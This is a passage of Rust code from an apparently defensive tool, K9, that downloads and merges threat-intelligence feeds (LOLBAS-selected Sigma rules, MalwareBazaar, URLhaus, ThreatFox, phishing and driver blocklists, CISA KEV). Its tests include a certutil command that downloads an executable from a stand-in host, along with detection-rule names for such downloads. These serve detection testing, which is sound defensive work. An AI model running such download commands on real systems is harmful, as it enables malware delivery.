pub const NEW_PACKAGES_FILE: &str = "neue_pakete.json";

/// The names of the release's packages that are not in `known` (plain file names only).
pub fn unknown_packages(release: &serde_json::Value, known: &[&str]) -> Vec<String> {
    release["assets"]
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(|a| a["name"].as_str())
        .filter(|n| !known.contains(n) && n.len() <= 80 && n.chars().all(|c| c.is_ascii_alphanumeric() || "._+-".contains(c)))
        .map(str::to_string)
        .collect()
}

fn note_new_packages(dir: &Path, provider: &str, release: &serde_json::Value, known: &[&str]) {
    let new = unknown_packages(release, known);
    let mut all = new_packages(dir);
    all.retain(|(p, _)| p != provider);
    all.extend(new.into_iter().map(|n| (provider.to_string(), n)));
    if let Ok(json) = serde_json::to_vec(&all) {
        let _ = write_atomic(dir, NEW_PACKAGES_FILE, &json);
    }
}

/// (provider, package name) of the packages seen at the last update that K9 does not know.
pub fn new_packages(dir: &Path) -> Vec<(String, String)> {
    std::fs::read(dir.join(NEW_PACKAGES_FILE)).ok().and_then(|d| serde_json::from_slice(&d).ok()).unwrap_or_default()
}

pub const LOLBAS_URL: &str = "https://lolbas-project.github.io/api/lolbas.json";

/// File names of the Sigma rules the LOLBAS list refers to, and how many of its programs have one.
pub fn lolbas_rule_names(json: &[u8]) -> Result<(std::collections::BTreeSet<String>, usize, usize)> {
    let list: serde_json::Value = serde_json::from_slice(json).context("LOLBAS-Liste ungültig")?;
    let entries = list.as_array().context("LOLBAS-Liste: keine Liste")?;
    let mut names = std::collections::BTreeSet::new();
    let mut with_rule = 0;
    for e in entries {
        let mut any = false;
        for d in e["Detection"].as_array().into_iter().flatten() {
            if let Some(file) = d["Sigma"].as_str().and_then(|u| u.rsplit('/').next()).filter(|f| f.ends_with(".yml") && f.len() < 200) {
                names.insert(file.to_string());
                any = true;
            }
        }
        with_rule += any as usize;
    }
    Ok((names, entries.len(), with_rule))
}

/// Is this rule text one of the level "medium"? (The levels high and critical are in the
/// package "core" already; "low" and "informational" are too noisy.)
pub fn is_medium_rule(text: &str) -> bool {
    text.lines().any(|l| l.trim_end() == "level: medium")
}

/// LOLBAS: the list of Windows programs attackers abuse names, for most of them, Sigma rules.
/// Loaded are exactly those rules for process starts that have the level "medium" (the package
/// "core" only holds high and critical) – from the package "all rules" of the latest SigmaHQ
/// release. The list itself only selects; a program name alone is never a finding.
fn update_lolbas(dir: &Path) -> Result<Update> {
    const WANTED: &str = "sigma_all_rules.zip";
    let (names, programs, with_rule) = lolbas_rule_names(&download(LOLBAS_URL, &[], 5 * MB)?)?;
    if names.is_empty() {
        bail!("LOLBAS-Liste nennt keine Sigma-Regel");
    }
    let api = download("https://api.github.com/repos/SigmaHQ/sigma/releases/latest", &[], 5 * MB)?;
    let release: serde_json::Value = serde_json::from_slice(&api).context("GitHub-Antwort ungültig")?;
    let tag = release["tag_name"].as_str().unwrap_or("unbekannt").to_string();
    let asset = release["assets"]
        .as_array()
        .and_then(|a| a.iter().find(|x| x["name"].as_str() == Some(WANTED)))
        .with_context(|| format!("{WANTED} nicht im Release {tag}"))?;
    let url = asset["browser_download_url"].as_str().context("Download-Adresse fehlt")?;
    let data = download(url, &[], 60 * MB)?;
    match asset["digest"].as_str().and_then(|d| d.strip_prefix("sha256:")) {
        Some(expected) => {
            let actual = crate::sha256_hex(&data);
            if !actual.eq_ignore_ascii_case(expected) {
                bail!("Prüfsumme von {WANTED} stimmt nicht (erwartet {expected}, erhalten {actual})");
            }
        }
        None => tracing::warn!("LOLBAS: keine Prüfsumme im Sigma-Release veröffentlicht"),
    }
    let mut zip = zip::ZipArchive::new(std::io::Cursor::new(&data[..])).context("Sigma-Paket: kein gültiges ZIP-Archiv")?;
    let mut texts: Vec<String> = Vec::new();
    for i in 0..zip.len() {
        use std::io::Read;
        let mut f = zip.by_index(i)?;
        let Ok(name) = f.name().map(|n| n.replace('\\', "/")) else { continue };
        if !name.contains("rules/windows/process_creation/") || f.size() > 256 * 1024 {
            continue;
        }
        if !name.rsplit('/').next().is_some_and(|file| names.contains(file)) {
            continue;
        }
        let mut s = String::new();
        if f.read_to_string(&mut s).is_ok() && is_medium_rule(&s) {
            texts.push(s);
        }
    }
    let set = crate::sigma::RuleSet::from_texts(texts.iter().map(|s| s.as_str()));
    if set.rules.is_empty() {
        bail!("LOLBAS: keine auswertbare Sigma-Regel der Stufe mittel im Paket {tag}");
    }
    write_atomic(dir, crate::sigma::LOLBAS_FILE, &serde_json::to_vec(&texts)?)?;
    Ok(Update {
        version: format!(
            "Sigma {tag}: {} Regeln der Stufe mittel für Programmstarts (davon {} nie auslösbar), ausgewählt über {with_rule} von {programs} LOLBAS-Programmen",
            set.rules.len(),
            set.dormant
        ),
        entries: set.rules.len() as u64,
        files: vec![record(dir, crate::sigma::LOLBAS_FILE)?],
        license: Some(SourceId::Lolbas.license().to_string()),
        ..Default::default()
    })
}

/// Counts the `license = "..."` metadata values of a YARA source.
pub fn license_summary(source: &str) -> String {
    let mut counts: BTreeMap<String, usize> = BTreeMap::new();
    for line in source.lines() {
        let l = line.trim();
        if let Some(rest) = l.strip_prefix("license") {
            if let Some(v) = rest.trim_start().strip_prefix('=').map(str::trim) {
                let v = v.trim_matches('"').trim();
                let v = v.split_whitespace().next().unwrap_or("?");
                *counts.entry(v.to_string()).or_default() += 1;
            }
        }
    }
    let mut v: Vec<(String, usize)> = counts.into_iter().collect();
    v.sort_by_key(|e| std::cmp::Reverse(e.1));
    v.iter().take(8).map(|(k, n)| format!("{k} ({n})")).collect::<Vec<_>>().join(", ")
}

// ------------------------------------------------------------------- abuse.ch

pub const MB_HASH_FILE: &str = "abusech/malwarebazaar_sha256.bin";
pub const URLHAUS_FILE: &str = "abusech/urlhaus.txt";
pub const THREATFOX_FILE: &str = "abusech/threatfox.json";
pub const URLHAUS_HOSTS_FILE: &str = "abusech/urlhaus_hosts.txt";

/// Parses hex SHA-256 lines into a sorted, deduplicated binary list (32 bytes each).
pub fn hashes_to_sorted_bin(text: &str) -> Vec<u8> {
    let mut list: Vec<[u8; 32]> = text
        .lines()
        .map(str::trim)
        .filter(|l| !l.starts_with('#'))
        .filter_map(|l| {
            let h = l.split([',', ';', ' ', '"']).find(|p| p.len() == 64)?;
            let mut out = [0u8; 32];
            hex::decode_to_slice(h, &mut out).ok()?;
            Some(out)
        })
        .collect();
    list.sort_unstable();
    list.dedup();
    list.concat()
}

/// Marker: when the complete MalwareBazaar list was loaded last (its change time counts).
const MB_FULL_MARKER: &str = "abusech/malwarebazaar_voll.txt";

/// Union of two sorted, deduplicated hash lists (32 bytes each), sorted and deduplicated.
pub fn merge_sorted_bin(a: &[u8], b: &[u8]) -> Vec<u8> {
    let (mut x, mut y) = (a.as_chunks::<32>().0.iter().peekable(), b.as_chunks::<32>().0.iter().peekable());
    let mut out = Vec::with_capacity(a.len() + b.len());
    loop {
        let next = match (x.peek(), y.peek()) {
            (Some(p), Some(q)) => match p.cmp(q) {
                std::cmp::Ordering::Less => x.next(),
                std::cmp::Ordering::Greater => y.next(),
                std::cmp::Ordering::Equal => {
                    y.next();
                    x.next()
                }
            },
            (Some(_), None) => x.next(),
            (None, Some(_)) => y.next(),
            (None, None) => break,
        };
        if let Some(h) = next {
            out.extend_from_slice(h);
        }
    }
    out
}

/// The complete list (about 1.2 million hashes) once a day; in between, every hour, only the
/// export of the last 48 hours (about 1000 hashes, under 100 KB) is merged into it.
fn update_malwarebazaar(dir: &Path) -> Result<Update> {
    let age = |rel: &str| std::fs::metadata(dir.join(rel)).and_then(|m| m.modified()).ok().and_then(|t| t.elapsed().ok());
    // Without a marker (list loaded by a version before 0.20.0) the age of the list itself counts.
    let full_age = age(MB_FULL_MARKER).or_else(|| age(MB_HASH_FILE));
    let existing = std::fs::read(dir.join(MB_HASH_FILE)).unwrap_or_default();
    let usable = !existing.is_empty() && existing.len().is_multiple_of(32);
    let full_due = !usable || full_age.is_none_or(|a| a >= std::time::Duration::from_secs(24 * 3600));
    if full_due {
        match update_malwarebazaar_full(dir) {
            // abuse.ch refuses the large export (e.g. 429, too many requests): the newest
            // samples are still merged in; the complete list is tried again next hour.
            Err(e) if usable => tracing::warn!("MalwareBazaar: vollständige Liste nicht geladen ({e:#}) – nur die neuesten Proben"),
            other => return other,
        }
    } else if age(MB_FULL_MARKER).is_none() {
        // From now on the marker counts: the hourly merge changes the list's own time.
        write_atomic(dir, MB_FULL_MARKER, today().as_bytes())?;
    }
    {
        let recent = abusech_download("mb-api.abuse.ch", "sha256_recent.txt", 20 * MB)?;
        let add = hashes_to_sorted_bin(&String::from_utf8_lossy(&recent));
        if add.is_empty() {
            bail!("MalwareBazaar-Export der neuesten Proben enthält keine Hashes");
        }
        let bin = merge_sorted_bin(&existing, &add);
        let new = (bin.len() - existing.len()) / 32;
        if new > 0 {
            write_atomic(dir, MB_HASH_FILE, &bin)?;
        }
        let mut details = BTreeMap::new();
        details.insert("neu_in_dieser_stunde".to_string(), new as u64);
        Ok(Update {
            version: format!("{} (neueste Proben {})", today(), chrono::Local::now().format("%H:%M")),
            entries: (bin.len() / 32) as u64,
            files: vec![record(dir, MB_HASH_FILE)?],
            license: None,
            details,
        })
    }
}

fn update_malwarebazaar_full(dir: &Path) -> Result<Update> {
    let zip = abusech_download("mb-api.abuse.ch", "sha256_full.txt.zip", 300 * MB)?;
    let (_, text) = unzip_entry(&zip, |n| n.ends_with(".txt"), 1024 * MB)?;
    let bin = hashes_to_sorted_bin(&String::from_utf8_lossy(&text));
    if bin.is_empty() {
        bail!("MalwareBazaar-Export enthält keine Hashes");
    }
    write_atomic(dir, MB_HASH_FILE, &bin)?;
    write_atomic(dir, MB_FULL_MARKER, today().as_bytes())?;
    Ok(Update { version: today(), entries: (bin.len() / 32) as u64, files: vec![record(dir, MB_HASH_FILE)?], license: None, ..Default::default() })
}

fn update_urlhaus(dir: &Path) -> Result<Update> {
    let data = abusech_download("urlhaus-api.abuse.ch", "urls_online.txt", 200 * MB)?;
    let text = String::from_utf8_lossy(&data);
    let urls: Vec<&str> = text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#')).collect();
    if urls.is_empty() {
        bail!("URLhaus-Liste ist leer");
    }
    write_atomic(dir, URLHAUS_FILE, urls.join("\n").as_bytes())?;
    // Curated list of hosts dedicated to malware distribution (for DNS checks).
    let mut files = vec![record(dir, URLHAUS_FILE)?];
    let mut details = BTreeMap::new();
    match abusech_download("urlhaus-api.abuse.ch", "hostfile.txt", 50 * MB) {
        Ok(h) => {
            let hosts: Vec<String> = String::from_utf8_lossy(&h)
                .lines()
                .filter(|l| !l.trim_start().starts_with('#'))
                .filter_map(|l| l.split_whitespace().nth(1).map(|s| s.to_ascii_lowercase()))
                .collect();
            details.insert("hosts".to_string(), hosts.len() as u64);
            write_atomic(dir, URLHAUS_HOSTS_FILE, hosts.join("\n").as_bytes())?;
            files.push(record(dir, URLHAUS_HOSTS_FILE)?);
        }
        Err(e) => tracing::warn!("URLhaus-Hostliste nicht geladen: {e:#}"),
    }
    Ok(Update { version: today(), entries: urls.len() as u64, files, license: None, details })
}

/// One ThreatFox IOC as kept locally.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Default)]
pub struct Ioc {
    pub typ: String,
    pub malware: String,
    pub first_seen: String,
    /// e.g. "botnet_cc" (for the firewall block only high-confidence C2 servers count).
    #[serde(default)]
    pub threat_type: String,
    #[serde(default)]
    pub confidence: u8,
    #[serde(default)]
    pub last_seen: String,
}

/// Merges the ThreatFox "recent" export into the local IOC store and drops
/// entries older than 180 days.
pub fn merge_threatfox(existing: &mut BTreeMap<String, Ioc>, recent_json: &[u8], today: &str) -> Result<usize> {
    let v: serde_json::Value = serde_json::from_slice(recent_json).context("ThreatFox-Antwort ungültig")?;
    let obj = v.as_object().context("ThreatFox-Format unerwartet")?;
    let mut added = 0;
    for entries in obj.values() {
        for e in entries.as_array().into_iter().flatten() {
            let (Some(value), Some(typ)) = (e["ioc_value"].as_str(), e["ioc_type"].as_str()) else { continue };
            let typ = match typ {
                "sha256_hash" => "sha256",
                "url" => "url",
                "domain" => "domain",
                "ip:port" => "ip",
                _ => continue,
            };
            let first = e["first_seen_utc"].as_str().unwrap_or(today).chars().take(10).collect::<String>();
            if !existing.contains_key(value) {
                added += 1;
            }
            existing.insert(
                value.trim().to_string(),
                Ioc {
                    typ: typ.into(),
                    malware: e["malware_printable"].as_str().unwrap_or("unbekannt").to_string(),
                    first_seen: first,
                    threat_type: e["threat_type"].as_str().unwrap_or("").to_string(),
                    confidence: e["confidence_level"].as_u64().unwrap_or(0).min(100) as u8,
                    last_seen: e["last_seen_utc"].as_str().unwrap_or("").chars().take(10).collect(),
                },
            );
        }
    }
    let cutoff = chrono::NaiveDate::parse_from_str(today, "%Y-%m-%d")
        .map(|d| (d - chrono::Duration::days(180)).format("%Y-%m-%d").to_string())
        .unwrap_or_default();
    existing.retain(|_, i| i.first_seen >= cutoff);
    Ok(added)
}

pub fn load_threatfox(dir: &Path) -> BTreeMap<String, Ioc> {
    std::fs::read(dir.join(THREATFOX_FILE)).ok().and_then(|b| serde_json::from_slice(&b).ok()).unwrap_or_default()
}

fn update_threatfox(dir: &Path) -> Result<Update> {
    // Full export = all IOCs of the last 6 months (abuse.ch expires older ones).
    let zip = abusech_download("threatfox-api.abuse.ch", "full.json.zip", 300 * MB)?;
    let (_, data) = unzip_entry(&zip, |n| n.ends_with(".json"), 2048 * MB)?;
    let mut iocs = load_threatfox(dir);
    merge_threatfox(&mut iocs, &data, &today())?;
    write_atomic(dir, THREATFOX_FILE, &serde_json::to_vec(&iocs)?)?;
    let mut details = BTreeMap::new();
    for ioc in iocs.values() {
        *details.entry(ioc.typ.clone()).or_insert(0u64) += 1;
    }
    Ok(Update { version: today(), entries: iocs.len() as u64, files: vec![record(dir, THREATFOX_FILE)?], license: None, details })
}

// ------------------------------------------------------------------ OpenPhish

pub const OPENPHISH_FILE: &str = "openphish/feed.txt";

fn update_openphish(dir: &Path) -> Result<Update> {
    let data = download(SourceId::OpenPhish.url(), &[], 50 * MB)?;
    let text = String::from_utf8_lossy(&data);
    let n = text.lines().filter(|l| l.starts_with("http")).count();
    if n == 0 {
        bail!("OpenPhish-Feed ist leer");
    }
    write_atomic(dir, OPENPHISH_FILE, &data)?;
    Ok(Update { version: Local::now().format(TS).to_string(), entries: n as u64, files: vec![record(dir, OPENPHISH_FILE)?], license: None, ..Default::default() })
}

// -------------------------------------------------------------- driver lists

fn update_loldrivers(dir: &Path) -> Result<Update> {
    let data = download(crate::treiber::LOL_URL, &[], 200 * MB)?;
    let idx = crate::treiber::parse_loldrivers(&data)?;
    let n = idx.eintraege.len() as u64;
    write_atomic(dir, crate::treiber::LOL_FILE, &serde_json::to_vec(&idx)?)?;
    Ok(Update {
        version: Local::now().format("%Y-%m-%d").to_string(),
        entries: n,
        files: vec![record(dir, crate::treiber::LOL_FILE)?],
        license: None,
        ..Default::default()
    })
}

/// List of malicious browser extension IDs (only valid IDs are kept).
fn update_malext(dir: &Path) -> Result<Update> {
    let data = download(crate::erweiterungen::MALEXT_URL, &[], 20 * MB)?;
    let ids = crate::erweiterungen::parse_malicious(&String::from_utf8_lossy(&data));
    if ids.len() < 100 {
        bail!("Liste der Schad-Erweiterungen unerwartet klein ({} Einträge) – nicht übernommen", ids.len());
    }
    let mut sorted: Vec<&String> = ids.iter().collect();
    sorted.sort();
    let text = sorted.iter().map(|s| s.as_str()).collect::<Vec<_>>().join("\n");
    write_atomic(dir, crate::erweiterungen::MALEXT_FILE, text.as_bytes())?;
    Ok(Update {
        version: Local::now().format("%Y-%m-%d").to_string(),
        entries: ids.len() as u64,
        files: vec![record(dir, crate::erweiterungen::MALEXT_FILE)?],
        license: None,
        ..Default::default()
    })
}

/// Phishing domains (malware-filter); public suffixes are never taken over.
fn update_phishfilter(dir: &Path) -> Result<Update> {
    let data = download(crate::phishing::PHISHFILTER_URL, &[], 50 * MB)?;
    let hosts = crate::phishing::parse_feed(&String::from_utf8_lossy(&data));
    if hosts.len() < 1000 {
        bail!("Phishing-Liste unerwartet klein ({} Einträge) – nicht übernommen", hosts.len());
    }
    write_atomic(dir, crate::phishing::PHISHFILTER_FILE, hosts.join("\n").as_bytes())?;
    Ok(Update {
        version: Local::now().format(TS).to_string(),
        entries: hosts.len() as u64,
        files: vec![record(dir, crate::phishing::PHISHFILTER_FILE)?],
        license: None,
        ..Default::default()
    })
}

fn update_ms_treiber(dir: &Path) -> Result<Update> {
    let data = download(crate::treiber::MS_URL, &[], 50 * MB)?;
    let xml = crate::treiber::ms_xml_from_zip(&data)?;
    let xml = xml.as_str();
    let version = xml.split("<VersionEx>").nth(1).and_then(|s| s.split('<').next()).unwrap_or("?").to_string();
    let idx = crate::treiber::parse_ms_blocklist(xml)?;
    let n = idx.len() as u64;
    write_atomic(dir, crate::treiber::MS_FILE, &serde_json::to_vec(&idx)?)?;
    Ok(Update { version, entries: n, files: vec![record(dir, crate::treiber::MS_FILE)?], license: None, ..Default::default() })
}

// ------------------------------------------------------------------- CISA KEV

pub const KEV_FILE: &str = "kev/known_exploited_vulnerabilities.json";

fn update_kev(dir: &Path) -> Result<Update> {
    let data = download(SourceId::CisaKev.url(), &[], 100 * MB)?;
    let v: serde_json::Value = serde_json::from_slice(&data).context("KEV-Katalog ungültig")?;
    let n = v["vulnerabilities"].as_array().map(|a| a.len()).unwrap_or(0);
    if n == 0 {
        bail!("KEV-Katalog enthält keine Einträge");
    }
    write_atomic(dir, KEV_FILE, &data)?;
    Ok(Update {
        version: v["catalogVersion"].as_str().unwrap_or("?").to_string(),
        entries: n as u64,
        files: vec![record(dir, KEV_FILE)?],
        license: None,
        ..Default::default()
    })
}

// ----------------------------------------------------------------- statistics

/// Formats a number with German thousands separators: 1172572 -> "1.172.572".
pub fn fmt_num(n: u64) -> String {
    let s = n.to_string();
    let mut out = String::new();
    for (i, c) in s.chars().enumerate() {
        if i > 0 && (s.len() - i).is_multiple_of(3) {
            out.push('.');
        }
        out.push(c);
    }
    out
}

/// One line of the per-source overview.
#[derive(Debug, Clone, Serialize)]
pub struct SourceLine {
    pub schluessel: String,
    pub name: String,
    pub aktiv: bool,
    pub ok: bool,
    pub eintraege: u64,
    pub stand: Option<String>,
    pub aktualisiert: Option<String>,
    pub fehler: Option<String>,
}

/// Summary of the loaded detection data (dashboard, `k9 quellen`, PDF).
#[derive(Debug, Clone, Serialize)]
pub struct DataStats {
    /// Time of this snapshot.
    pub stand: String,
    pub quellen_ok: usize,
    pub quellen_aktiv: usize,
    /// MalwareBazaar + ThreatFox SHA-256 IOCs.
    pub schadsoftware_hashes: u64,
    pub malwarebazaar_hashes: u64,
    pub threatfox_hashes: u64,
    /// URLhaus + OpenPhish + ThreatFox URL/domain IOCs.
    pub schad_adressen: u64,
    pub urlhaus_adressen: u64,
    pub openphish_adressen: u64,
    pub phishing_filter_domains: u64,
    pub threatfox_adressen: u64,
    pub threatfox_iocs: u64,
    pub yara_regeln: u64,
    /// Real number of signatures from the CVD/CLD headers.
    pub clamav_signaturen: u64,
    pub kev_eintraege: u64,
    pub quellen: Vec<SourceLine>,
}

impl Sources {
    pub fn stats(&self, cfg: &QuellenConfig) -> DataStats {
        let entries = |id: SourceId| {
            let st = self.get(id);
            if st.last_update.is_some() { st.entries } else { 0 }
        };
        let mut tf = self.get(SourceId::ThreatFox).details;
        if tf.is_empty() && self.get(SourceId::ThreatFox).last_update.is_some() {
            for ioc in load_threatfox(&self.dir).values() {
                *tf.entry(ioc.typ.clone()).or_insert(0) += 1;
            }
        }
        let tf_hashes = tf.get("sha256").copied().unwrap_or(0);
        let tf_addr = tf.get("url").copied().unwrap_or(0) + tf.get("domain").copied().unwrap_or(0) + tf.get("ip").copied().unwrap_or(0);
        let clam: u64 = crate::clamav::signature_counts(&self.dir).values().sum();
        let mut quellen = Vec::new();
        for id in SourceId::ALL {
            let st = self.get(id);
            let aktiv = id.enabled(cfg);
            // A rate limit (429) keeps the previous, still valid data -> counts as OK.
            let ok = aktiv && st.last_update.is_some() && st.error.as_deref().is_none_or(|e| e.contains(" 429") || e.contains("(429)"));
            quellen.push(SourceLine {
                schluessel: id.key().into(),
                name: id.label().into(),
                aktiv,
                ok,
                eintraege: if id == SourceId::ClamAv && clam > 0 { clam } else { entries(id) },
                stand: st.version.clone(),
                aktualisiert: st.last_update.clone(),
                fehler: st.error.clone(),
            });
        }
        let urlhaus = entries(SourceId::UrlHaus);
        let openphish = entries(SourceId::OpenPhish);
        let phishfilter = entries(SourceId::PhishFilter);
        let mb = entries(SourceId::MalwareBazaar);
        DataStats {
            stand: Local::now().format(TS).to_string(),
            quellen_ok: quellen.iter().filter(|q| q.ok).count(),
            quellen_aktiv: quellen.iter().filter(|q| q.aktiv).count(),
            schadsoftware_hashes: mb + tf_hashes,
            malwarebazaar_hashes: mb,
            threatfox_hashes: tf_hashes,
            schad_adressen: urlhaus + openphish + phishfilter + tf_addr,
            urlhaus_adressen: urlhaus,
            openphish_adressen: openphish,
            phishing_filter_domains: phishfilter,
            threatfox_adressen: tf_addr,
            threatfox_iocs: entries(SourceId::ThreatFox),
            yara_regeln: entries(SourceId::YaraForge),
            clamav_signaturen: clam,
            kev_eintraege: entries(SourceId::CisaKev),
            quellen,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_package_k9_does_not_know_is_noticed() {
        let release = serde_json::json!({"assets": [
            {"name": "sigma_core.zip"}, {"name": "sigma_all_rules.zip"}, {"name": "sigma_cloud_addon.zip"},
            {"name": "boese <script>.zip"}, {"name": 7}
        ]});
        assert_eq!(unknown_packages(&release, KNOWN_SIGMA_PACKAGES), ["sigma_cloud_addon.zip"]);
        assert!(unknown_packages(&serde_json::json!({}), KNOWN_SIGMA_PACKAGES).is_empty());
        let dir = tempfile::tempdir_in(crate::test_tmp()).unwrap();
        assert!(new_packages(dir.path()).is_empty());
        note_new_packages(dir.path(), "SigmaHQ", &release, KNOWN_SIGMA_PACKAGES);
        note_new_packages(dir.path(), "YARA Forge", &serde_json::json!({"assets": [{"name": "yara-forge-rules-core.zip"}]}), KNOWN_YARA_PACKAGES);
        assert_eq!(new_packages(dir.path()), [("SigmaHQ".to_string(), "sigma_cloud_addon.zip".to_string())]);
        // Gone from the release (or known by a newer K9): no longer listed.
        note_new_packages(dir.path(), "SigmaHQ", &serde_json::json!({"assets": [{"name": "sigma_core.zip"}]}), KNOWN_SIGMA_PACKAGES);
        assert!(new_packages(dir.path()).is_empty());
    }

    #[test]
    fn the_lolbas_list_only_selects_sigma_rules() {
        let json = br#"[
            {"Name":"Certutil.exe","Detection":[
                {"Sigma":"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_certutil_download.yml"},
                {"IOC":"certutil.exe creating new files on disk"}]},
            {"Name":"Ohne.exe","Detection":null},
            {"Name":"Bitsadmin.exe","Detection":[
                {"Sigma":"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml"},
                {"Sigma":"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_certutil_download.yml"}]}
        ]"#;
        let (names, programs, with_rule) = lolbas_rule_names(json).unwrap();
        assert_eq!((programs, with_rule), (3, 2));
        assert_eq!(names.into_iter().collect::<Vec<_>>(), ["proc_creation_win_bitsadmin_download.yml", "proc_creation_win_certutil_download.yml"]);
        assert!(lolbas_rule_names(b"{}").is_err());
        assert!(is_medium_rule("title: x\nlevel: medium\n"));
        assert!(is_medium_rule("title: x\r\nlevel: medium\r\n"));
        assert!(!is_medium_rule("title: x\nlevel: high\n"));
        assert!(!is_medium_rule("description: this has level: medium in the text\nlevel: low\n"));
    }

    /// Loads the real lists from the internet into a temporary folder and prints what comes
    /// out. `cargo test -p k9-core lolbas_live -- --ignored --nocapture`
    #[test]
    #[ignore]
    fn lolbas_live() {
        let dir = tempfile::tempdir_in(crate::test_tmp()).unwrap();
        let u = update_lolbas(dir.path()).unwrap();
        println!("{}", u.version);
        // For the sandbox test of the rules (offline): keep the loaded rules where asked.
        if let Ok(out) = std::env::var("K9_LOLBAS_OUT") {
            std::fs::copy(dir.path().join(crate::sigma::LOLBAS_FILE), &out).unwrap();
            println!("gespeichert: {out}");
        }
        let set = crate::sigma::live_lolbas(dir.path()).expect("lesbar");
        let events = [
            crate::sigma::Event { image: "C:\\Windows\\System32\\certutil.exe", command_line: "certutil -urlcache -split -f http://example.invalid/a.exe a.exe", parent_image: "\\cmd.exe", parent_command_line: None },
            crate::sigma::Event { image: "C:\\Program Files\\Git\\usr\\bin\\bash.exe", command_line: "bash -c \"cargo build --release\"", parent_image: "\\claude.exe", parent_command_line: None },
            crate::sigma::Event { image: "C:\\Windows\\System32\\msiexec.exe", command_line: "msiexec /i setup.msi /qn", parent_image: "\\explorer.exe", parent_command_line: None },
            crate::sigma::Event { image: "C:\\Windows\\System32\\rundll32.exe", command_line: "rundll32.exe shell32.dll,Control_RunDLL", parent_image: "\\explorer.exe", parent_command_line: None },
            crate::sigma::Event { image: "C:\\Program Files (x86)\\Steam\\steam.exe", command_line: "steam.exe -silent", parent_image: "\\explorer.exe", parent_command_line: None },
        ];
        for ev in &events {
            let hits: Vec<&str> = set.matches(ev).iter().map(|r| r.title.as_str()).collect();
            println!("{} -> {:?}", ev.command_line, hits);
        }
        let start = std::time::Instant::now();
        for i in 0..2000 {
            let _ = set.matches(&events[i % events.len()]);
        }
        println!("{:.0} Mikrosekunden je Programmstart", start.elapsed().as_secs_f64() * 1e6 / 2000.0);
    }

    #[test]
    fn newest_hashes_are_merged_into_the_complete_list() {
        let h = |c: char| c.to_string().repeat(64);
        let full = hashes_to_sorted_bin(&format!("{}\n{}\n{}\n", h('1'), h('5'), h('9')));
        let recent = hashes_to_sorted_bin(&format!("{}\n{}\n{}\n", h('0'), h('5'), h('7')));
        let merged = merge_sorted_bin(&full, &recent);
        assert_eq!(merged.len() / 32, 5, "Vereinigung ohne Doppelte");
        let firsts: Vec<u8> = merged.as_chunks::<32>().0.iter().map(|c| c[0]).collect();
        assert_eq!(firsts, vec![0x00, 0x11, 0x55, 0x77, 0x99], "bleibt sortiert (binaere Suche)");
        assert_eq!(merge_sorted_bin(&full, &[]), full);
        assert_eq!(merge_sorted_bin(&[], &recent), recent);
    }

    #[test]
    fn malwarebazaar_is_due_every_hour_other_sources_daily() {
        let dir = tempfile::tempdir_in(crate::test_tmp()).unwrap();
        let mut s = Sources::open_dir(dir.path().to_path_buf()).unwrap();
        let cfg = QuellenConfig::default();
        let now = chrono::Local::now().naive_local();
        let two_hours_ago = (now - chrono::Duration::hours(2)).format(TS).to_string();
        for id in [SourceId::MalwareBazaar, SourceId::UrlHaus] {
            let st = s.status.entry(id.key().to_string()).or_default();
            st.last_update = Some(two_hours_ago.clone());
        }
        assert!(s.is_due(SourceId::MalwareBazaar, &cfg, now), "stuendlich");
        assert!(!s.is_due(SourceId::UrlHaus, &cfg, now), "taeglich");
        let mut slow = QuellenConfig::default();
        slow.intervall_stunden.insert("malwarebazaar".into(), 6);
        assert!(!s.is_due(SourceId::MalwareBazaar, &slow, now), "eigene Einstellung gilt");
    }

    #[test]
    fn sorted_hash_list() {
        let a = "a".repeat(64);
        let b = "0".repeat(64);
        let text = format!("# Kommentar\n{a}\n{b}\n{a}\nkaputt\n\"{b}\",x\n");
        let bin = hashes_to_sorted_bin(&text);
        assert_eq!(bin.len(), 64);
        assert_eq!(&bin[..32], &[0u8; 32]);
    }

    #[test]
    fn threatfox_merge_and_prune() {
        let mut store = BTreeMap::new();
        store.insert(
            "alt.example".to_string(),
            Ioc { typ: "domain".into(), malware: "Alt".into(), first_seen: "2026-01-01".into(), ..Default::default() },
        );
        let json = br#"{"1":[{"ioc_value":"http://boese.invalid/x","ioc_type":"url","malware_printable":"Test","first_seen_utc":"2026-11-12 10:00:00"}],
                       "2":[{"ioc_value":"1.2.3.4:80","ioc_type":"ip:port","malware_printable":"Test"}]}"#;
        let added = merge_threatfox(&mut store, json, "2026-11-13").unwrap();
        assert_eq!(added, 2);
        assert!(store.contains_key("http://boese.invalid/x"));
        assert!(!store.contains_key("alt.example"), "älter als 180 Tage wird entfernt");
        assert_eq!(store.get("1.2.3.4:80").map(|i| i.typ.as_str()), Some("ip"));
    }

    #[test]
    fn status_due_and_integrity() {
        let dir = tempfile::tempdir_in(crate::test_tmp()).unwrap();
        let mut s = Sources::open_dir(dir.path().to_path_buf()).unwrap();
        let cfg = QuellenConfig::default();
        let now = NaiveDateTime::parse_from_str("2026-11-13 12:00:00", TS).unwrap();
        assert!(s.is_due(SourceId::OpenPhish, &cfg, now));
        write_atomic(dir.path(), OPENPHISH_FILE, b"https://x.invalid/\n").unwrap();
        let rec = record(dir.path(), OPENPHISH_FILE).unwrap();
        s.status.insert(
            "openphish".into(),
            SourceStatus { last_update: Some("2026-11-13 08:00:00".into()), files: vec![rec], ..Default::default() },
        );
        s.save().unwrap();
        assert!(!s.is_due(SourceId::OpenPhish, &cfg, now));
        assert!(s.integrity_warnings().is_empty());
        // Another AV removes the file -> clear warning.
        std::fs::remove_file(dir.path().join(OPENPHISH_FILE)).unwrap();
        let w = Sources::open_dir(dir.path().to_path_buf()).unwrap().integrity_warnings();
        assert_eq!(w.len(), 1);
        assert!(w[0].contains("fehlt"));
    }

    #[test]
    fn license_summary_counts() {
        let src = "rule a {\n meta:\n  license = \"MIT\"\n condition: true }\nrule b {\n meta:\n  license = \"DRL 1.1\"\n condition: true }\nrule c {\n meta:\n  license = \"MIT\"\n condition: true }\n";
        let s = license_summary(src);
        assert!(s.starts_with("MIT (2)"), "{s}");
        assert!(s.contains("DRL (1)"));
    }

    #[test]
